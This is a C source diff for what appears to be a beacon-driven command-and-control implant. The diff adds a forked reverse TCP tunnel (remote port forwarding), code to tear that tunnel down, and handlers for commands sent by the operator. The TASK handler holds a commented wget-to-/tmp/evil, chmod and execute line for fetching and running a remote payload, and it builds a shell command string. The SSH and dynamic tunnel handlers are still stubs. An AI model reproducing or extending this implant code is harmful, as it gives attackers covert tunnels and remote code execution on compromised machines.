@@ -5,6 +5,7 @@
 #include <libgen.h>
 #include <errno.h>
 #include <sys/types.h>
+#include <signal.h>
 
 #include "command.h"
 #include "beacon.h"
@@ -13,13 +14,64 @@
 
 #define MAX_ATTR_LEN 128
 
+struct process tcp_tunnel = { 0 };
+struct process ssh_tunnel = { 0 };
+struct process task = { 0 };
+
+/* OpenSSH command equivalent:
+ * ssh <ssh-server> -p <ssh-server-port> -R <rport>:<laddress>:<lport>
+ *
+ * lport:   port to forward to once tunnel established
+ * rport:   port the ssh server will be listening on
+ */
+static int remote_forwarding(int lport, int rport)
+{
+	if ((rport < 1 || rport > 65535) || (lport < 1 || lport > 65535))
+		return -1;
+
+	sigset_t new_mask, old_mask;
+	sigemptyset(&new_mask);
+	sigaddset(&new_mask, SIGCHLD);
+	if (sigprocmask(SIG_BLOCK, &new_mask, &old_mask) == -1) {
+		printf(RED("sigprocmask\n"));
+	}
+
+	tcp_tunnel.pid = 0;
+	tcp_tunnel.is_alive = 0;
+
+	int ret;
+	pid_t pid = fork();
+	switch (pid) {
+	case -1:		/* Error */
+		printf(RED("[*] Fork error\n"));
+		ret = -1;
+		break;
+	case 0:		/* Child, do tunnel */
+		ret = do_remote_forwarding(lport, rport);
+		printf(YELLOW("[OTCP] Executing terminated with status %d\n"),
+		       ret);
+		_exit(ret);
+	default:		/* Parent, go back to execution loop */
+		tcp_tunnel.pid = pid;
+		tcp_tunnel.is_alive = 1;
+		if (sigprocmask(SIG_SETMASK, &old_mask, NULL) == -1) {
+			printf(RED("Could not restore signal mask!\n"));
+		}
+		printf(BLUE("[*] Remote port forwarding launched\n"));
+		ret = 1;	/* SUCC */
+		break;
+	}
+
+	return ret;
+}
+
 static int validate_param(const char *cmd, const char *param)
 {
 	return 1;
 }
 
-#define SUCC 1
-#define FAIL (-1)
+#define EXEC_SUCCESS 1
+#define EXEC_FAIL (-1)
 
 static int exec_command(char *cmd, char *param)
 {
@@ -30,7 +82,7 @@ static int exec_command(char *cmd, char *param)
 		// if (is_valid_interval(param))
 		timeout = (int)strtol(param, NULL, 10);
 		printf(GREEN("[*] Timeout set to %d seconds\n"), timeout);
-		ret = SUCC;
+		ret = EXEC_SUCCESS;
 	} else if (strcmp(cmd, "OTCP") == 0) {
 		/* remote port forwarding: L22C900 */
 		// if (is_valid_port_spec(param))
@@ -38,32 +90,43 @@ static int exec_command(char *cmd, char *param)
 		sscanf(param, "L%dC%d", &lport, &rport);
 		printf("[*] Calling do_remote_tunnel(%d, %d)\n", lport, rport);
 		ret = remote_forwarding(lport, rport);
-		if (ret == SUCC) {
+		if (ret == EXEC_SUCCESS) {
 			printf(GREEN("[*] Opened TCP tunnel on port %d\n"),
 			       lport);
 		} else {
 			printf(RED("[*] Failed to open TCP tunnel\n"));
 		}
 	} else if (strcmp(cmd, "CTCP") == 0) {
-		printf(GREEN("[CTCP] TCP tunnel closed\n"));
-		return FAIL;
+		if (tcp_tunnel.pid != 0) {
+			if (tcp_tunnel.is_alive) {
+				if (kill(tcp_tunnel.pid, SIGTERM) == -1) {
+					printf(RED("Kill failed\n"));
+					ret = EXEC_FAIL;
+				} else {
+					printf(GREEN
+					       ("[*] TCP tunnel closed\n"));
+					ret = EXEC_SUCCESS;
+				}
+			}
+			tcp_tunnel.pid = 0;
+		}
 	} else if (strcmp(cmd, "OSSH") == 0) {
 		printf(GREEN("[OSSH] Opened SSH tunnel on port X\n"));
-		return FAIL;
+		return EXEC_FAIL;
 	} else if (strcmp(cmd, "CSSH") == 0) {
 		printf(GREEN("[CSSH] SSH tunnel closed\n"));
-		return FAIL;
+		return EXEC_FAIL;
 	} else if (strcmp(cmd, "ODYN") == 0) {
 		printf(GREEN("[ODYN] Opened dynamic on port X\n"));
-		return FAIL;
+		return EXEC_FAIL;
 	} else if (strcmp(cmd, "CDYN") == 0) {
 		printf(GREEN("[CDYN] Dynamic closed\n"));
-		return FAIL;
+		return EXEC_FAIL;
 	} else if (strcmp(cmd, "TASK") == 0) {
 		// if (is_valid_url(param))
 		char *cmd_str = malloc(256);
 		if (cmd_str == NULL)
-			return FAIL;
+			return EXEC_FAIL;
 		char *filename = basename(param);
 		// wget -O /tmp/evil http://127.0.0.1/http_client_linux_x64 && chmod u+x /tmp/evil && /tmp/evil
 		sprintf(cmd_str,
@@ -72,7 +135,7 @@ static int exec_command(char *cmd, char *param)
 		printf(GREEN("[TASK] %s\n"), cmd_str);
 		// system(cmd_str);
 		free(cmd_str);
-		return FAIL;
+		return EXEC_FAIL;
 	}
 
 	return ret;
@@ -192,7 +255,7 @@ void parse_and_exec(char *beacon_response)
 		       curr_cmd->id);
 		curr_cmd->ret = exec_command(curr_cmd->type, curr_cmd->param);
 		printf("[*] Command [%d] status: %s\n", curr_cmd->id,
-		       (curr_cmd->ret == SUCC) ? GREEN("V") : RED("X"));
+		       (curr_cmd->ret == EXEC_SUCCESS) ? GREEN("V") : RED("X"));
 		curr_cmd = curr_cmd->next;
 
 		// do something with the ret value...
